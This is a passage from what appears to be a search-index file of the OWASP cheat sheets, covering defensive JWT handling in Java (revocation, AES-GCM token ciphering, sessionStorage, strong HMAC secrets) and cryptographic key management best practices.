prepareStatement ( query )) { pStatement . setString ( 1 , jwtTokenDigestInHex ); try ( ResultSet rSet = pStatement . executeQuery ()) { tokenIsPresent = rSet . next (); } } } } return tokenIsPresent ; } /** * Add a digest encoded in HEX of the ciphered token to the revocation token table * * @param jwtInHex Token encoded in HEX * @throws Exception If any issue occur during communication with DB */ public void revokeToken ( String jwtInHex ) throws Exception { if ( jwtInHex != null && ! jwtInHex . trim (). isEmpty ()) { //Decode the ciphered token byte [] cipheredToken = DatatypeConverter . parseHexBinary ( jwtInHex ); //Compute a SHA256 of the ciphered token MessageDigest digest = MessageDigest . getInstance ( \"SHA-256\" ); byte [] cipheredTokenDigest = digest . digest ( cipheredToken ); String jwtTokenDigestInHex = DatatypeConverter . printHexBinary ( cipheredTokenDigest ); //Check if the token digest in HEX is already in the DB and add it if it is absent if ( ! this . isTokenRevoked ( jwtInHex )) { try ( Connection con = this . storeDS . getConnection ()) { String query = \"insert into revoked_token(jwt_token_digest) values(?)\" ; int insertedRecordCount ; try ( PreparedStatement pStatement = con . prepareStatement ( query )) { pStatement . setString ( 1 , jwtTokenDigestInHex ); insertedRecordCount = pStatement . executeUpdate (); } if ( insertedRecordCount != 1 ) { throw new IllegalStateException ( \"Number of inserted record is invalid,\" + \" 1 expected but is \" + insertedRecordCount ); } } } } }","title":"Token Revocation Management"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#token-information-disclosure","text":"","title":"Token Information Disclosure"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#symptom_3","text":"This attack occurs when an attacker has access to a token (or a set of tokens) and extracts information stored in it (the contents of JWT tokens are base64 encoded, but is not encrypted by default) in order to obtain information about the system. Information can be for example the security roles, login format...","title":"Symptom"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#how-to-prevent_3","text":"A way to protect against this attack is to cipher the token using, for example, a symmetric algorithm. It's also important to protect the ciphered data against attack like Padding Oracle or any other attack using cryptanalysis. In order to achieve all these goals, the AES- GCM algorithm is used which provides Authenticated Encryption with Associated Data . More details from here : AEAD primitive (Authenticated Encryption with Associated Data) provides functionality of symmetric authenticated encryption. Implementations of this primitive are secure against adaptive chosen ciphertext attacks. When encrypting a plaintext one can optionally provide associated data that should be authenticated but not encrypted. That is, the encryption with associated data ensures authenticity (ie. who the sender is) and integrity (ie. data has not been tampered with) of that data, but not its secrecy. See RFC5116: https://tools.ietf.org/html/rfc5116 Note: Here ciphering is added mainly to hide internal information but it's very important to remember that the first protection against tampering of the JWT token is the signature. So, the token signature and its verification must be always in place.","title":"How to Prevent"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#implementation-example_3","text":"","title":"Implementation Example"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#token-ciphering","text":"Code in charge of managing the ciphering. Google Tink dedicated crypto library is used to handle ciphering operations in order to use built-in best practices provided by this library. /** * Handle ciphering and deciphering of the token using AES-GCM. * * @see \"https://github.com/google/tink/blob/master/docs/JAVA-HOWTO.md\" */ public class TokenCipher { /** * Constructor - Register AEAD configuration * * @throws Exception If any issue occur during AEAD configuration registration */ public TokenCipher () throws Exception { AeadConfig . register (); } /** * Cipher a JWT * * @param jwt Token to cipher * @param keysetHandle Pointer to the keyset handle * @return The ciphered version of the token encoded in HEX * @throws Exception If any issue occur during token ciphering operation */ public String cipherToken ( String jwt , KeysetHandle keysetHandle ) throws Exception { //Verify parameters if ( jwt == null || jwt . isEmpty () || keysetHandle == null ) { throw new IllegalArgumentException ( \"Both parameters must be specified!\" ); } //Get the primitive Aead aead = AeadFactory . getPrimitive ( keysetHandle ); //Cipher the token byte [] cipheredToken = aead . encrypt ( jwt . getBytes (), null ); return DatatypeConverter . printHexBinary ( cipheredToken ); } /** * Decipher a JWT * * @param jwtInHex Token to decipher encoded in HEX * @param keysetHandle Pointer to the keyset handle * @return The token in clear text * @throws Exception If any issue occur during token deciphering operation */ public String decipherToken ( String jwtInHex , KeysetHandle keysetHandle ) throws Exception { //Verify parameters if ( jwtInHex == null || jwtInHex . isEmpty () || keysetHandle == null ) { throw new IllegalArgumentException ( \"Both parameters must be specified !\" ); } //Decode the ciphered token byte [] cipheredToken = DatatypeConverter . parseHexBinary ( jwtInHex ); //Get the primitive Aead aead = AeadFactory . getPrimitive ( keysetHandle ); //Decipher the token byte [] decipheredToken = aead . decrypt ( cipheredToken , null ); return new String ( decipheredToken ); } }","title":"Token Ciphering"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#creation-validation-of-the-token","text":"Use the token ciphering handler during the creation and the validation of the token. Load keys (ciphering key was generated and stored using Google Tink ) and setup cipher. //Load keys from configuration text/json files in order to avoid to storing keys as a String in JVM memory private transient byte [] keyHMAC = Files . readAllBytes ( Paths . get ( \"src\" , \"main\" , \"conf\" , \"key-hmac.txt\" )); private transient KeysetHandle keyCiphering = CleartextKeysetHandle . read ( JsonKeysetReader . withFile ( Paths . get ( \"src\" , \"main\" , \"conf\" , \"key-ciphering.json\" ). toFile ())); ... //Init token ciphering handler TokenCipher tokenCipher = new TokenCipher (); Token creation. //Generate the JWT token using the JWT API... //Cipher the token (String JSON representation) String cipheredToken = tokenCipher . cipherToken ( token , this . keyCiphering ); //Send the ciphered token encoded in HEX to the client in HTTP response... Token validation. //Retrieve the ciphered token encoded in HEX from the HTTP request... //Decipher the token String token = tokenCipher . decipherToken ( cipheredToken , this . keyCiphering ); //Verify the token using the JWT API... //Verify access...","title":"Creation / Validation of the Token"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#token-storage-on-client-side","text":"","title":"Token Storage on Client Side"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#symptom_4","text":"This occurs when an application stores the token in a manner exhibiting the following behavior: Automatically sent by the browser ( Cookie storage). Retrieved even if the browser is restarted (Use of browser localStorage container). Retrieved in case of XSS issue (Cookie accessible to JavaScript code or Token stored in browser local/session storage).","title":"Symptom"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#how-to-prevent_4","text":"Store the token using the browser sessionStorage container. Add it as a Bearer HTTP Authentication header with JavaScript when calling services. Add fingerprint information to the token. By storing the token in browser sessionStorage container it exposes the token to being stolen through a XSS attack. However, fingerprints added to the token prevent reuse of the stolen token by the attacker on their machine. To close a maximum of exploitation surfaces for an attacker, add a browser Content Security Policy to harden the execution context. Note: The remaining case is when an attacker uses the user's browsing context as a proxy to use the target application through the legitimate user but the Content Security Policy can prevent communication with non expected domains. It's also possible to implement the authentication service in a way that the token is issued within a hardened cookie, but in this case, protection against a Cross-Site Request Forgery attack must be implemented.","title":"How to Prevent"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#implementation-example_4","text":"JavaScript code to store the token after authentication. /* Handle request for JWT token and local storage*/ function authenticate () { const login = $ ( \"#login\" ). val (); const postData = \"login=\" + encodeURIComponent ( login ) + \"&password=test\" ; $ . post ( \"/services/authenticate\" , postData , function ( data ) { if ( data . status == \"Authentication successful!\" ) { ... sessionStorage . setItem ( \"token\" , data . token ); } else { ... sessionStorage . removeItem ( \"token\" ); } }) . fail ( function ( jqXHR , textStatus , error ) { ... sessionStorage . removeItem ( \"token\" ); }); } JavaScript code to add the token as a Bearer HTTP Authentication header when calling a service, for example a service to validate token here. /* Handle request for JWT token validation */ function validateToken () { var token = sessionStorage . getItem ( \"token\" ); if ( token == undefined || token == \"\" ) { $ ( \"#infoZone\" ). removeClass (); $ ( \"#infoZone\" ). addClass ( \"alert alert-warning\" ); $ ( \"#infoZone\" ). text ( \"Obtain a JWT token first :)\" ); return ; } $ . ajax ({ url : \"/services/validate\" , type : \"POST\" , beforeSend : function ( xhr ) { xhr . setRequestHeader ( \"Authorization\" , \"bearer \" + token ); }, success : function ( data ) { ... }, error : function ( jqXHR , textStatus , error ) { ... }, }); }","title":"Implementation Example"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#weak-token-secret","text":"","title":"Weak Token Secret"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#symptom_5","text":"When the token is protected using an HMAC based algorithm, the security of the token is entirely dependent on the strength of the secret used with the HMAC. If an attacker can obtain a valid JWT, they can then carry out an offline attack and attempt to crack the secret using tools such as John the Ripper or Hashcat . If they are successful, they would then be able to modify the token and re-sign it with the key they had obtained. This could let them escalate their privileges, compromise other users' accounts, or perform other actions depending on the contents of the JWT. There are a number of guides that document this process in greater detail.","title":"Symptom"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#how-to-prevent_5","text":"The simplest way to prevent this attack is to ensure that the secret used to sign the JWTs is strong and unique, in order to make it harder for an attacker to crack. As this secret would never need to be typed by a human, it should be at least 64 characters, and generated using a secure source of randomness . Alternatively, consider the use of tokens that are signed with RSA rather than using an HMAC and secret key.","title":"How to Prevent"},{"location":"cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#further-reading","text":"{JWT}.{Attack}.Playbook - A project documents the known attacks and potential security vulnerabilities and misconfigurations of JSON Web Tokens. JWT Best Practices Internet Draft","title":"Further Reading"},{"location":"cheatsheets/Key_Management_Cheat_Sheet.html","text":"Key Management Cheat Sheet \u00b6 Introduction \u00b6 This Key Management Cheat Sheet provides developers with guidance for implementation of cryptographic key management within an application in a secure manner. It is important to document and harmonize rules and practices for: key life cycle management (generation, distribution, destruction) key compromise, recovery and zeroization key storage key agreement General Guidelines and Considerations \u00b6 Formulate a plan for the overall organization's cryptographic strategy to guide developers working on different applications and ensure that each application's cryptographic capability meets minimum requirements and best practices. Identify the cryptographic and key management requirements for your application and map all components that process or store cryptographic key material. Key Selection \u00b6 Selection of the cryptographic and key management algorithms to use within a given application should begin with an understanding of the objectives of the application. For example, if the application is required to store data securely, then the developer should select an algorithm suite that supports the objective of data at rest protection security. Applications that are required to transmit and receive data would select an algorithm suite that supports the objective of data in transit protection. We have provided recommendations on the selection of crypto suites within an application based on application and security objectives. Application developers oftentimes begin the development of crypto and key management capabilities by examining what is available in a library. However, an analysis of the real needs of the application should be conducted to determine the optimal key management approach. Begin by understanding the security objectives of the application which will then drive the selection of cryptographic protocols that are best suited. For example, the application may require: Confidentiality of data at rest and confidentiality of data in transit. Authenticity of the end device. Authenticity of data origin. Integrity of data in transit. Keys to create the data encryption keys. Once the understanding of the security needs of the application is achieved, developers can determine what protocols and algorithms are required. Once the protocols and algorithms are understood, you can begin to define the different types of keys that will support the application's objectives. There are a diverse set of key types and certificates to consider, for example: Encryption: Symmetric encryption keys, Asymmetric encryption keys (public and private). Authentication of End Devices: Pre-shared symmetric keys, Trusted certificates, Trust Anchors. Data Origin Authentication: HMAC . Integrity Protection: Message Authentication Codes (MACs). Key Encryption Keys . Algorithms and Protocols \u00b6 According to NIST SP 800-57 Part 1 , many algorithms and schemes that provide a security service use a hash function as a component of the algorithm. Hash functions can be found in digital signature algorithms ( FIPS186 ), Keyed-Hash Message Authentication Codes (HMAC) ( FIPS198 ), key-derivation functions/methods ( NIST Special Publications (SP) 800-56A, 800-56B, 800-56C and 800-108 ), and random number generators ( NIST SP 800-90A ). Approved hash functions are defined in FIPS180 . NIST SP 800-57 Part 1 recognizes three basic classes of approved cryptographic algorithms: hash functions, symmetric- key algorithms and asymmetric-key algorithms. The classes are defined by the number of cryptographic keys that are used in conjunction with the algorithm. Cryptographic hash functions \u00b6 Cryptographic hash functions do not require keys. Hash functions generate a relatively small digest (hash value) from a (possibly) large input in a way that is fundamentally difficult to reverse (i.e., it is hard to find an input that will produce a given output). Hash functions are used as building blocks for key management, for example, To provide data authentication and integrity services (Section 4.2.3) \u2013 the hash function is used with a key to generate a message authentication code. To compress messages for digital signature generation and verification (Section 4.2.4). To derive keys in key-establishment algorithms (Section 4.2.5). To generate deterministic random numbers (Section 4.2.7). Symmetric-key algorithms \u00b6 Symmetric-key algorithms (sometimes known as secret-key algorithms) transform data in a way that is fundamentally difficult to undo without knowledge of a secret key. The key is \"symmetric\" because the same key is used for a cryptographic operation and its inverse (e.g., encryption and decryption). Symmetric keys are often known by more than one entity; however, the key shall not be disclosed to entities that are not authorized access to the data protected by that algorithm and key. Symmetric key algorithms are used, for example, To provide data confidentiality (Section 4.2.2); the same key is used to encrypt and decrypt data. To provide authentication and integrity services (Section 4.2.3) in the form of Message Authentication Codes (MACs); the same key is used to generate the MAC and to validate it. MACs normally employ either a symmetric key-encryption algorithm or a cryptographic hash function as their cryptographic primitive. As part of the key-establishment process (Section 4.2.5). To generate deterministic random numbers (Section 4.2.7). Asymmetric-key algorithms \u00b6 Asymmetric-key algorithms, commonly known as public-key algorithms, use two related keys (i.e., a key pair) to perform their functions: a public key and a private key. The public key may be known by anyone; the private key should be under the sole control of the entity that \"owns\" the key pair. Even though the public and private keys of a key pair are related, knowledge of the public key does not reveal the private key. Asymmetric algorithms are used, for example, To compute digital signatures (Section 4.2.4). To establish cryptographic keying material (Section 4.2.5). To generate random numbers (Section 4.2.7). Message Authentication Codes (MACs) \u00b6 Message Authentication Codes (MACs) provide data authentication and integrity. A MAC is a cryptographic checksum on the data that is used in order to provide assurance that the data has not changed and that the MAC was computed by the expected entity. Although message integrity is often provided using non-cryptographic techniques known as error detection codes, these codes can be altered by an adversary to effect an action to the adversary's benefit. The use of an approved cryptographic mechanism, such as a MAC, can alleviate this problem. In addition, the MAC can provide a recipient with assurance that the originator of the data is a key holder (i.e., an entity authorized to have the key). MACs are often used to authenticate the originator to the recipient when only those two parties share the MAC key. Digital Signatures \u00b6 Digital signatures are used to provide authentication, integrity and non-repudiation . Digital signatures are used in conjunction with hash functions and are computed on data of any length (up to a limit that is determined by the hash function). FIPS186 specifies algorithms that are approved for the computation of digital signatures. Key Encryption Keys \u00b6 Symmetric key-wrapping keys are used to encrypt other keys using symmetric-key algorithms. Key-wrapping keys are also known as key encrypting keys. Key Strength \u00b6 Review NIST SP 800-57 (Recommendation for Key Management) for recommended guidelines on key strength for specific algorithm implementations. Also, consider these best practices: Establish what the application's minimum computational resistance to attack should be. Understanding the minimum computational resistance to attack should take into consideration the sophistication of your adversaries, how long data needs to be protected, where data is stored and if it is exposed. Identifying the computational resistance to attack will inform engineers as to the minimum length of the cryptographic key required to protect data over the life of that data. Consult NIST SP 800-131a for additional guidance on determining the appropriate key lengths for the algorithm of choice. When encrypting keys for storage or distribution, always encrypt a cryptographic key with another key of equal or greater cryptographic strength. When moving to Elliptic Curve-based algorithms , choose a key length that meets or exceeds the comparative strength of other algorithms in use within your system. Refer to NIST SP 800-57 Table 2 . Formulate a strategy for the overall organization's cryptographic strategy to guide developers working on different applications and ensure that each application's cryptographic capability meets minimum requirements and best practices. Memory Management Considerations \u00b6 Keys stored in memory for a long time can become \"burned in\". This can be mitigated by splitting the key into components that are frequently updated. NIST SP 800.57 ). Loss or corruption of the memory media on which keys and/or certificates are stored, and recovery planning, according to NIST SP 800.57 . Plan for the recovery from possible corruption of the memory media necessary for key or certificate generation, registration, and/or distribution systems, subsystems, or components as recommended in NIST SP 800.57 . Perfect Forward Secrecy \u00b6 Ephemeral keys can provide perfect forward secrecy protection, which means a compromise of the server's long term signing key does not compromise the confidentiality of past sessions. Refer to TLS cheat sheet . Key Usage \u00b6 According to NIST, in general, a single key should be used for only one purpose (e.g., encryption, authentication, key wrapping, random number generation, or digital signatures). There are several reasons for this: The use of the same key for two different cryptographic processes may weaken the security provided by one or both of the processes. Limiting the use of a key limits the damage that could be done if the key is compromised. Some uses of keys interfere with each other. For example, the length of time the key may be required for each use and purpose. Retention requirements of the data may differ for different data types. Cryptographic Module Topics \u00b6 According to NIST SP800-133 , cryptographic modules are the set of hardware, software, and/or firmware that implements security functions (including cryptographic algorithms and key generation) and is contained within a cryptographic module boundary to provide protection of the keys. Key Management Lifecycle Best Practices \u00b6 Generation \u00b6 Cryptographic keys shall be generated within cryptographic module with at least a FIPS 140-2 compliance. For explanatory purposes, consider the cryptographic module in which a key is generated to be the key-generating module. Any random value required by the key-generating module shall be generated within that module; that is, the Random Bit Generator that generates the random value shall be implemented within cryptographic module with at least a FIPS 140-2 compliance that generates the key. Hardware cryptographic modules are preferred over software cryptographic modules for protection. Distribution \u00b6 The generated keys shall be transported (when necessary) using secure channels and shall be used by their associated cryptographic algorithm within at least a FIPS 140-2 compliant cryptographic modules. For additional detail for the recommendations in this section refer to NIST Special Paper 800-133 . Storage \u00b6 Developers must understand where cryptographic keys are stored within the application. Understand what memory devices the keys are stored on. Keys must be protected on both volatile and persistent memory, ideally processed within secure cryptographic modules. Keys should never be stored in plaintext format. Ensure all keys are stored in cryptographic vault, such as a hardware security module (HSM) or isolated cryptographic service. If you are planning on storing keys in offline devices/databases, then encrypt the keys using Key Encryption Keys (KEKs) prior to the export of the key material. KEK length (and algorithm) should be equivalent to or greater in strength than the keys being protected. Ensure that keys have integrity protections applied while in storage (consider dual purpose algorithms that support encryption and Message Code Authentication (MAC)). Ensure that standard application level code never reads or uses cryptographic keys in any way and use key management libraries. Ensure that keys and cryptographic operation is done inside the sealed vault. All work should be done in the vault (such as key access, encryption, decryption, signing, etc). Escrow and Backup \u00b6 Data that has been encrypted with lost cryptographic keys will never be recovered. Therefore, it is essential that the application incorporate a secure key backup capability, especially for applications that support data at rest encryption for long-term data stores. When backing up keys, ensure that the database that is used to store the keys is encrypted using at least a FIPS 140-2 validated module. It is sometimes useful to escrow key material for use in investigations and for re-provisioning of key material to users in the event that the key is lost or corrupted. Never escrow keys used for performing digital signatures, but consider the need to escrow keys that support encryption. Oftentimes, escrow can be performed by the Certificate Authority (CA) or key management system that provisions certificates and keys, however in some instances separate APIs must be implemented to allow the system to perform the escrow for the application. Accountability and Audit \u00b6 Accountability involves the identification of those that have access to, or control of, cryptographic keys throughout their lifecycles. Accountability can be an effective tool to help prevent key compromises and to reduce the impact of compromises once they are detected. Although it is preferred that no humans are able to view keys, as a minimum, the key management system should account for all individuals who are able to view plaintext cryptographic keys. In addition, more sophisticated key-management systems may account for all individuals authorized to access or control any cryptographic keys, whether in plaintext or ciphertext form. Accountability provides three significant advantages: It aids in the determination of when the compromise could have occurred and what individuals could have been involved. It tends to protect against compromise, because individuals with access to the key know that their access to the key is known. It is very useful in recovering from a detected key compromise to know where the key was used and what data or other keys were protected by the compromised key. Certain principles have been found to be useful in enforcing the accountability of cryptographic keys. These principles might not apply to all systems or all types of keys. Some of the principles that apply to long-term keys controlled by humans include: Uniquely identifying keys. Identifying the key user. Identifying the dates and times of key use, along with the data that is protected. Identifying other keys that are protected by a symmetric or private key. Two types of audit should be performed on key management systems: The security plan and the procedures that are developed to support the plan should be periodically audited to ensure that they continue to support the Key Management Policy ( NIST SP 800-57 Part 2 ). The protective mechanisms employed should be periodically reassessed with respect to the level of security that they provide and are expected to provide in the future, and that the mechanisms correctly and effectively support the appropriate policies. New technology developments and attacks should be taken into consideration. On a more frequent basis, the actions of the humans that use, operate and maintain the system should be reviewed to verify that the humans continue to follow established security procedures. Strong cryptographic systems can be compromised by lax and inappropriate human actions. Highly unusual events should be noted and reviewed as possible indicators of attempted attacks on the system. Key Compromise and Recovery \u00b6 The compromise of a key has the following implications: In general, the unauthorized disclosure of a key used to provide confidentiality protection (i.e., via encryption) means that all information encrypted by that key could be exposed or known by unauthorized entities. The disclosure of a Certificate of Authorities's private signature key means that an adversary can create fraudulent certificates and Certificate Revocation Lists (CRLs). A compromise of the integrity of a key means that the key is incorrect - either that the key has been modified (either deliberately or accidentally), or that another key has been substituted; this includes a deletion (non-availability) of the key. The substitution or modification of a key used to provide integrity calls into question the integrity of all information protected by the key. This information could have been provided by, or changed by, an unauthorized entity that knows the key. The substitution of a public or secret key that will be used (at a later time) to encrypt data could allow an unauthorized entity (who knows the decryption key) to decrypt data that was encrypted using the encryption key. A compromise of a key's usage or application association means that the key could be used for the wrong purpose (e.g., for key establishment instead of digital signatures) or for the wrong application, and could result in the compromise of information protected by the key. A compromise of a key's association with the owner or other entity means that the identity of the other entity cannot be assured (i.e., one does not know who the other entity really is) or that information cannot be processed correctly (e.g., decrypted with the correct key). A compromise of a key's association with other information means that there is no association at all, or the association is with the wrong \"information\". This could cause the cryptographic services to fail, information to be lost, or the security of the information to be compromised. Certain protective measures may be taken in order to minimize the likelihood or consequences of a key compromise. Similar affect as ransomware, except that you can't pay the ransom and get the key back. The following procedures are usually involved: Limiting the amount of time a symmetric or private key is in plaintext form. Preventing humans from viewing plaintext symmetric and private keys. Restricting plaintext symmetric and private keys to physically protected containers. This includes key generators, key-transport devices, key loaders, cryptographic modules, and key-storage devices. Using integrity checks to ensure that the integrity of a key or its association with other data has not been compromised. For example, keys may be wrapped (i.e., encrypted) in such a manner that unauthorized modifications to the wrapping or to the associations will be detected. Employing key confirmation (see NIST SP 800-57 Part 1 Section 4.2.5.5) to help ensure that the proper key was, in fact, established. Establishing an accountability system that keeps track of each access to symmetric and private keys in plaintext form. Providing a cryptographic integrity check on the key (e.g., using a MAC or a digital signature). The use of trusted timestamps for signed data. i. Destroying keys as soon as they are no longer needed. Creating a compromise-recovery plan, especially in the case of a CA compromise. A compromise-recovery plan is essential for restoring cryptographic security services in the event of a key compromise. A compromise-recovery plan shall be documented and easily accessible. The compromise-recovery plan should contain: The identification and contact info of the personnel to notify. The identification and contact info of the personnel to perform the recovery actions. The re-key method. An inventory of all cryptographic keys and their use (e.g., the location of all certificates in a system). The education of all appropriate personnel on the recovery procedures. An identification and contact info of all personnel needed to support the recovery procedures. Policies that key-revocation checking be enforced (to minimize the effect of a compromise). The monitoring of the re-keying operations (to ensure that all required operations are performed for all affected keys). Any other recovery procedures, which may include: Physical inspection of the equipment. Identification of all information that may be compromised as a result of the incident. Identification of all signatures that may be invalid, due to the compromise of a signing key. Distribution of new keying material, if required. Trust Stores \u00b6 Design controls to secure the trust store against injection of third-party root certificates. The access controls are managed and enforced on an entity and application basis. Implement integrity controls on objects stored in the trust store. Do not allow for export of keys held within the trust store without authentication and authorization. Setup strict policies and procedures for exporting key material from applications to network applications and other components. Implement a secure process for updating the trust store. Cryptographic Key Management Libraries \u00b6 Use only reputable crypto libraries that are well maintained and updated, as well as tested and validated by third-party organizations (e.g., NIST / FIPS ) Documentation \u00b6 The definitive guide to encryption key management fundamentals . Practical cryptography for developers .","title":"Key Management"},{"location":"cheatsheets/Key_Management_Cheat_Sheet.html#key-management-cheat-sheet","text":"","title":"Key Management Cheat Sheet"},{"location":"cheatsheets/Key_Management_Cheat_Sheet.html#introduction","text":"This Key Management Cheat Sheet provides developers with guidance for implementation of cryptographic key management within an application in a secure manner. It is important to document and harmonize rules and practices for: key life cycle management (generation, distribution, destruction) key compromise, recovery and zeroization key storage key agreement","title":"Introduction"},{"location":"cheatsheets/Key_Management_Cheat_Sheet.html#general-guidelines-and-considerations","text":"Formulate a plan for the overall organization's cryptographic strategy to guide developers working on different applications and ensure that each application's cryptographic capability meets minimum requirements and best practices. Identify the cryptographic and key management requirements for your application and map all components that process or store cryptographic key material.","title":"General Guidelines and Considerations"},{"location":"cheatsheets/Key_Management_Cheat_Sheet.html#key-selection","text":"Selection of the cryptographic and key management algorithms to use within a given application should begin with an understanding of the objectives of the application. For example, if the application is required to store data securely, then the developer should select an algorithm suite that supports the objective of data at rest protection security. Applications that are required to transmit and receive data would select an algorithm suite that supports the objective of data in transit protection. We have provided recommendations on the selection of crypto suites within an application based on application and security objectives. Application developers oftentimes begin the development of crypto and key management capabilities by examining what is available in a library. However, an analysis of the real needs of the application should be conducted to determine the optimal key management approach. Begin by understanding the security objectives of the application which will then drive the selection of cryptographic protocols that are best suited. For example, the application may require: Confidentiality of data at rest and confidentiality of data in transit. Authenticity of the end device. Authenticity of data origin. Integrity of data in transit. Keys to create the data encryption keys. Once the understanding of the security needs of the application is achieved, developers can determine what protocols and algorithms are required. Once the protocols and algorithms are understood, you can begin to define the different types of keys that will support the application's objectives. There are a diverse set of key types and certificates to consider, for example: Encryption: Symmetric encryption keys, Asymmetric encryption keys (public and private). Authentication of End Devices: Pre-shared symmetric keys, Trusted certificates, Trust Anchors. Data Origin Authentication: HMAC . Integrity Protection: Message Authentication Codes (MACs). Key Encryption Keys .","title":"Key Selection"},{"location":"cheatsheets/Key_Management_Cheat_Sheet.html#algorithms-and-protocols","text":"According to NIST SP 800-57 Part 1 , many algorithms and schemes that provide a security service use a hash function as a component of the algorithm. Hash functions can be found in digital signature algorithms ( FIPS186 ), Keyed-Hash Message Authentication Codes (HMAC) ( FIPS198 ), key-derivation functions/methods ( NIST Special Publications (SP) 800-56A, 800-56B, 800-56C and 800-108 ), and random number generators ( NIST SP 800-90A ). Approved hash functions are defined in FIPS180 . NIST SP 800-57 Part 1 recognizes three basic classes of approved cryptographic algorithms: hash functions, symmetric- key algorithms and asymmetric-key algorithms. The classes are defined by the number of cryptographic keys that are used in conjunction with the algorithm.","title":"Algorithms and Protocols"},{"location":"cheatsheets/Key_Management_Cheat_Sheet.html#cryptographic-hash-functions","text":"Cryptographic hash functions do not require keys. Hash functions generate a relatively small digest (hash value) from a (possibly) large input in a way that is fundamentally difficult to reverse (i.e., it is hard to find an input that will produce a given output). Hash functions are used as building blocks for key management, for example, To provide data authentication and integrity services (Section 4.2.3) \u2013 the hash function is used with a key to generate a message authentication code. To compress messages for digital signature generation and verification (Section 4.2.4). To derive keys in key-establishment algorithms (Section 4.2.5). To generate deterministic random numbers (Section 4.2.7).","title":"Cryptographic hash functions"},{"location":"cheatsheets/Key_Management_Cheat_Sheet.html#symmetric-key-algorithms","text":"Symmetric-key algorithms (sometimes known as secret-key algorithms) transform data in a way that is fundamentally difficult to undo without knowledge of a secret key. The key is \"symmetric\" because the same key is used for a cryptographic operation and its inverse (e.g., encryption and decryption). Symmetric keys are often known by more than one entity; however, the key shall not be disclosed to entities that are not authorized access to the data protected by that algorithm and key. Symmetric key algorithms are used, for example, To provide data confidentiality (Section 4.2.2); the same key is used to encrypt and decrypt data. To provide authentication and integrity services (Section 4.2.3) in the form of Message Authentication Codes (MACs); the same key is used to generate the MAC and to validate it. MACs normally employ either a symmetric key-encryption algorithm or a cryptographic hash function as their cryptographic primitive. As part of the key-establishment process (Section 4.2.5). To generate deterministic random numbers (Section 4.2.7).","title":"Symmetric-key algorithms"},{"location":"cheatsheets/Key_Management_Cheat_Sheet.html#asymmetric-key-algorithms","text":"Asymmetric-key algorithms, commonly known as public-key algorithms, use two related keys (i.e., a key pair) to perform their functions: a public key and a private key. The public key may be known by anyone; the private key should be under the sole control of the entity that \"owns\" the key pair. Even though the public and private keys of a key pair are related, knowledge of the public key does not reveal the private key. Asymmetric algorithms are used, for example, To compute digital signatures (Section 4.2.4). To establish cryptographic keying material (Section 4.2.5). To generate random numbers (Section 4.2.7).","title":"Asymmetric-key algorithms"},{"location":"cheatsheets/Key_Management_Cheat_Sheet.html#message-authentication-codes-macs","text":"Message Authentication Codes (MACs) provide data authentication and integrity. A MAC is a cryptographic checksum on the data that is used in order to provide assurance that the data has not changed and that the MAC was computed by the expected entity. Although message integrity is often provided using non-cryptographic techniques known as error detection codes, these codes can be altered by an adversary to effect an action to the adversary's benefit. The use of an approved cryptographic mechanism, such as a MAC, can alleviate this problem. In addition, the MAC can provide a recipient with assurance that the originator of the data is a key holder (i.e., an entity authorized to have the key). MACs are often used to authenticate the originator to the recipient when only those two parties share the MAC key.","title":"Message Authentication Codes (MACs)"},{"location":"cheatsheets/Key_Management_Cheat_Sheet.html#digital-signatures","text":"Digital signatures are used to provide authentication, integrity and non-repudiation . Digital signatures are used in conjunction with hash functions and are computed on data of any length (up to a limit that is determined by the hash function). FIPS186 specifies algorithms that are approved for the computation of digital signatures.","title":"Digital Signatures"},{"location":"cheatsheets/Key_Management_Cheat_Sheet.html#key-encryption-keys","text":"Symmetric key-wrapping keys are used to encrypt other keys using symmetric-key algorithms. Key-wrapping keys are also known as key encrypting keys.","title":"Key Encryption Keys"},{"location":"cheatsheets/Key_Management_Cheat_Sheet.html#key-strength","text":"Review NIST SP 800-57 (Recommendation for Key Management) for recommended guidelines on key strength for specific algorithm implementations. Also, consider these best practices: Establish what the application's minimum computational resistance to attack should be. Understanding the minimum computational resistance to attack should take into consideration the sophistication of your adversaries, how long data needs to be protected, where data is stored and if it is exposed. Identifying the computational resistance to attack will inform engineers as to the minimum length of the cryptographic key required to protect data over the life of that data. Consult NIST SP 800-131a for additional guidance on determining the appropriate key lengths for the algorithm of choice. When encrypting keys for storage or distribution, always encrypt a cryptographic key with another key of equal or greater cryptographic strength. When moving to Elliptic Curve-based algorithms , choose a key length that meets or exceeds the comparative strength of other algorithms in use within your system. Refer to NIST SP 800-57 Table 2 . Formulate a strategy for the overall organization's cryptographic strategy to guide developers working on different applications and ensure that each application's cryptographic capability meets minimum requirements and best practices.","title":"Key Strength"},{"location":"cheatsheets/Key_Management_Cheat_Sheet.html#memory-management-considerations","text":"Keys stored in memory for a long time can become \"burned in\". This can be mitigated by splitting the key into components that are frequently updated. NIST SP 800.57 ). Loss or corruption of the memory media on which keys and/or certificates are stored, and recovery planning, according to NIST SP 800.57 . Plan for the recovery from possible corruption of the memory media necessary for key or certificate generation, registration, and/or distribution systems, subsystems, or components as recommended in NIST SP 800.57 .","title":"Memory Management Considerations"},{"location":"cheatsheets/Key_Management_Cheat_Sheet.html#perfect-forward-secrecy","text":"Ephemeral keys can provide perfect forward secrecy protection, which means a compromise of the server's long term signing key does not compromise the confidentiality of past sessions. Refer to TLS cheat sheet .","title":"Perfect Forward Secrecy"},{"location":"cheatsheets/Key_Management_Cheat_Sheet.html#key-usage","text":"According to NIST, in general, a single key should be used for only one purpose (e.g., encryption, authentication, key wrapping, random number generation, or digital signatures). There are several reasons for 